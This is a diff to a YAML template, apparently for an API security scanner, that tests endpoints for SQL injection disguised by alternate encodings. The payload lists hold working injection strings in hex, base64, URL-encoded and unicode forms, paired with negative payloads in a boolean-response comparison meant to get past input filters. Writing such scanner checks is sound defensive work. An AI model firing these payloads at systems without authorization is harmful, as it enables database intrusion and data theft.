@@ -1,7 +1,7 @@
 id: ALTERNATE_ENCODING_SQL_INJECTION
 info:
   name: "SQL Injection test using Alternate Encoding"
-  description: > 
+  description: >
     "SQL injection using alternate encoding involves exploiting vulnerabilities by bypassing input filters and security mechanisms that traditionally block or sanitize SQL injection attempts. Attackers use encoding techniques such as UTF-8, Unicode, or other character sets to evade detection and inject malicious SQL queries into vulnerable applications. This method aims to deceive input validation checks and execute unauthorized SQL commands, potentially compromising the confidentiality, integrity, and availability of the database and the application."
   details: >
     "SQL injection using alternate encoding is a technique where attackers manipulate input data using different character encodings (e.g., UTF-8, Unicode) to evade detection by security filters. By encoding special characters, attackers bypass input validation mechanisms and inject malicious SQL queries into vulnerable applications. This method aims to exploit weaknesses in how input data is processed, potentially leading to unauthorized access, data leakage, or database manipulation."
@@ -28,6 +28,8 @@ info:
     - CVE-2020-24008
     - CVE-2021-45901
 
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   response_code:
     gte: 200
@@ -39,7 +41,7 @@ api_selection_filters:
       gt: 0
     not_contains:
       - Error
-      - Internal Server 
+      - Internal Server
       - Failed
       - Unauthorized
       - access denied
@@ -83,7 +85,7 @@ wordLists:
   encodingPayloads:
     - "' OR 0x31=0x31"
     - " dXNlcidvciAnMQ=="
-    - "' OR '\u0031'='\u0031"
+    - "' OR '1'='1"
     - "' OR U&'\\0061'='a"
     - "%27%20OR%20%271%27%3D%271"
     - "' OR ASCII('1')=49"
@@ -91,7 +93,7 @@ wordLists:
   encodingNegativePayloads:
     - "' OR 0x31<>0x31"
     - " JyBvciAxPTAtLQ=="
-    - "' OR '\u0031'<>'\u0031"
+    - "' OR '1'<>'1"
     - "' OR U&'\\0061'<>'a"
     - "%27%20OR%20%271%27%3D%270"
     - "' OR ASCII('1')<>49"
@@ -99,81 +101,81 @@ wordLists:
 execute:
   type: multiple
   requests:
-  - req:
-    - modify_body_param:
-        userKey: ${userVal}${encodingPayloads}
-    - validate:
-        response_code:
-          gte: 200
-          lt: 300
-        response_payload:
-          length:
-            gt: 0
-          not_contains:
-            - Error
-            - Internal Server 
-            - Failed
-            - Unauthorized
-            - access denied
-            - Forbidden
-            - Method Not allowed
-            - Gateway timeout
-            - request timeout
-            - server error
-            - server busy
-            - authentication error
-            - authorization error
-            - validation error
-            - Permission Denied
-            - invalid token
-            - token expired
-            - session expired
-            - session timeout
-            - unexpected error
-            - unable to process request
-            - bad request
-            - service unavailable
-            - account is locked
-            - account is blocked
-            - multiple failed attempts
-    - success: x2
-    - failure: exit
-  - req:
-    - modify_body_param:
-        userKey: ${userVal}${encodingNegativePayloads}
-    - validate:
-        response_code:
-          gte: 200
-          lt: 300
-        response_payload:
-          length:
-            gt: 0  
-          not_contains:
-            - Error
-            - Internal Server 
-            - Failed
-            - Unauthorized
-            - access denied
-            - Forbidden
-            - Method Not allowed
-            - Gateway timeout
-            - request timeout
-            - server error
-            - server busy
-            - authentication error
-            - authorization error
-            - validation error
-            - Permission Denied
-            - invalid token
-            - token expired
-            - session expired
-            - session timeout
-            - unexpected error
-            - unable to process request
-            - bad request
-            - service unavailable
-            - account is locked
-            - account is blocked
-            - multiple failed attempts    
-          neq: "${x1.response.body}"
-    - success: vulnerable
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${encodingPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Failed
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid token
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${encodingNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Failed
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid token
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+              neq: "${x1.response.body}"
+        - success: vulnerable
